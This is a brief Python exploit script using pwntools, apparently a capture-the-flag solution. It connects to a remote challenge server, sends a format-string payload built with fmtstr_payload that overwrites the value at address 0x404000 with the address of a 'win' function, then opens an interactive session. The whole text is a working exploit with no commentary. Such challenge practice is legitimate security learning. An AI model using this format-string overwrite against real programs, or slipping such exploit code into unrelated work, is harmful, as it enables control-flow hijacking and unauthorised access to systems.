from pwn import *

elf = context.binary = ELF('./chall')
#p = process('./chall')
p = remote('0.cloud.chals.io', 30732)

offset = 8
target = 0x404000
win = 0x0000000000401196

payload = fmtstr_payload(offset, {target : win})
p.sendline(payload)
p.interactive()